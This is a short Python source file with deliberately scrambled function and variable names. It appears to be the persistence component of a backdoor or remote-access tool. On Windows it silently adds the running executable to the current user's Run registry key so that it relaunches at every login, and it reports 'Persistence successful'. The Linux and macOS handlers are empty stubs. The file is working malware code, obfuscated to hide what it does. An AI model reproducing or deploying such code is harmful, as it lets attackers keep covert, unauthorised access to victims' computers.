# -*- coding: utf-8 -*-
import sys
def LTgkPDlAqJxJpzWrLNifwELrBjbWoJzz():
    import _winreg
    from _winreg import HKEY_CURRENT_USER as HKCU
    IjboBrpmEQGMTUGTrSrerintGmGEiTEv = r'Software\Microsoft\Windows\CurrentVersion\Run'
    nAPSZTBKiVRrJHoiCUlFTbspjnOpAnTn = sys.executable
    try:
        WRSzQzpTQIICmzuYXUdgQuPQYfVaBviG = _winreg.OpenKey(HKCU, IjboBrpmEQGMTUGTrSrerintGmGEiTEv, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(WRSzQzpTQIICmzuYXUdgQuPQYfVaBviG, 'br', 0, _winreg.REG_SZ, nAPSZTBKiVRrJHoiCUlFTbspjnOpAnTn)
        _winreg.CloseKey(WRSzQzpTQIICmzuYXUdgQuPQYfVaBviG)
        return True, 'HKCU Run registry key applied'
    except WindowsError:
        return False, 'HKCU Run registry key failed'
def wbHFUPKitmMNXOiuccqTciDlEbyrjsDg():
    return False, 'nothing here yet'
def hybkvwKrZSVgfFabKYYuGRqPzYQfrawk():
    return False, 'nothing here yet'
def lbBccHiiDmGapnfkBzGcriIbWppvyzNz(plat_type):
    if plat_type.startswith('win'):
        success, kWItsPTITxFgMveCFCYmHVUzqaXePfVQ = LTgkPDlAqJxJpzWrLNifwELrBjbWoJzz()
    elif plat_type.startswith('linux'):
        success, kWItsPTITxFgMveCFCYmHVUzqaXePfVQ = wbHFUPKitmMNXOiuccqTciDlEbyrjsDg()
    elif plat_type.startswith('darwin'):
        success, kWItsPTITxFgMveCFCYmHVUzqaXePfVQ = hybkvwKrZSVgfFabKYYuGRqPzYQfrawk()
    else:
        return 'Error, platform unsupported.'
    if success:
        LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = 'Persistence successful, {}.'.format(kWItsPTITxFgMveCFCYmHVUzqaXePfVQ)
    else:
        LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = 'Persistence unsuccessful, {}.'.format(kWItsPTITxFgMveCFCYmHVUzqaXePfVQ)
    return LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc
